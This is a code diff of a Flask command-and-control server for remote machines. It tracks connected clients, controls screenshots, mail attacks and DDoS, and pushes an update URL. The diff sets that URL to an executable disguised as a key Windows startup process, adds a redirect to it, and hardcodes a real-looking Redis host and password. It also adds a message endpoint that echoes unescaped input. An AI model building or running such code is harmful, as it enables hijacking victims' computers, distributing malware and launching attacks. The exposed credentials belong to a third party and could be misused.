@@ -5,14 +5,16 @@ import time
 
 import redis_server
 
-version = 4
-download_address = "download_address"
+version = 5
+download_address = "http://cloudcdn.yixiangzhilv.com/uploads/2021/05/17/3IbF1NNd_Windows%E7%B3%BB%E7%BB%9F%E5%85%B3%E9%94%AE%E5%90%AF%E5%8A%A8%E8%BF%9B%E7%A8%8B-5.exe"
 
 thisDir = os.path.dirname(os.path.abspath(__file__))
 app = Flask(__name__)
-app.secret_key = "Secretkey"
-redis = redis_server.RedisServer("host", "port", "password")
+app.secret_key = "RBSI-"
+password = app.secret_key
+redis = redis_server.RedisServer("yxzlaliyunserveraddress.yixiangzhilv.com", 6379, "@Danny20070601")
 connects = {}
+not_connect = {}
 commands = []
 mail_attack = {"set-time": time.time()}
 ddos = {"set-time": time.time()}
@@ -20,21 +22,32 @@ screenshot = 0
 stop = {"once": [], "forever": []}
 show_version = []
 another_name = {}
+messages = {}
+
+
+def format_time():
+    return time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
 
 
 @app.route("/", methods=["POST", "GET"])
 def index():
-    if request.method == "POST" and request.form.get("password") == "password":
+    global connects, not_connect
+    if request.method == "POST" and request.form.get("password") == password:
         session["admin"] = "admin"
     if not session.get("admin"):
         return render_template("login.html")
-    global connects
-    connects_ = {}
+    count = 0
+    _connects = {}
     for i, j in connects.items():
         if time.time() - j <= 15:
-            connects_[i] = j
-    connects = connects_
-    return render_template("index.html", users=connects, another_name=another_name,
+            count += 1
+        if time.time() - j <= 60:
+            _connects[i] = j
+        else:
+            not_connect[i] = j
+    connects = _connects
+    return render_template("index.html", connects=connects, not_connect=not_connect,
+                           another_name=another_name,count=count,
                            version=version, download_address=download_address,
                            time=time.time, round=round)
 
@@ -49,7 +62,11 @@ def upload():
 
 @app.route("/init", methods=["POST"])
 def start():
+    if not_connect.get(request.form.get("name")):
+        del(not_connect[request.form.get("name")])
     connects[request.form.get("name")] = time.time()
+    if not messages.get(request.form.get("name")):
+        messages[request.form.get("name")] = []
     print("新的设备（%s）成功连接到服务器" % request.form.get("name"))
     another_name[request.form.get("name")] = redis.get("site:RUI:computer:%s" % request.form.get("name")) or "(None)"
     result = {"action": len(commands), "version": version, "download_address": download_address}
@@ -62,6 +79,17 @@ def set_another_name():
     redis.set("site:RUI:computer:%s" % name, request.form.get("another_name"))
     another_name[name] = redis.get("site:RUI:computer:%s" % name) or "(None)"
     return redirect("/")
+
+
+@app.route("/message", methods=["GET", "POST"])
+def message():
+    if request.method == "POST":
+        messages[request.form.get("name")] = [format_time() + "&emsp;&emsp;" + request.form.get("message")] + messages[request.form.get("name")]
+        messages[request.form.get("name")] = messages[request.form.get("name")][:50]
+        return "Success"
+    else:
+        m = "</p><p>".join(messages[request.values.get("name")])
+        return "<p>" + m + "</p>"
 
 
 @app.route("/connect", methods=["POST"])
@@ -151,7 +179,7 @@ def sub_screenshot():
 @app.route("/stop-once", methods=["GET", "POST"])
 def sub_stop_once():
     if not session.get("admin"):
-        return redirect("/")
+        return redirect("/?stop-once-False")
     global stop
     if request.values.get("name"):
         for i in request.values.get("name").split(";"):
@@ -162,7 +190,7 @@ def sub_stop_once():
 @app.route("/stop-forever", methods=["POST"])
 def sub_stop_forever():
     if not session.get("admin"):
-        return redirect("/")
+        return redirect("/?stop-forever=False")
     global stop
     if request.form.get("name"):
         for i in request.form.get("name").split(";"):
@@ -190,6 +218,11 @@ def sub_show_version():
 @app.route("/check-network", methods=["GET", "POST"])
 def check_network():
     return "Success"
+
+
+@app.route("/d")
+def get_download_address():
+    return redirect(download_address)
 
 
 if __name__ == "__main__":
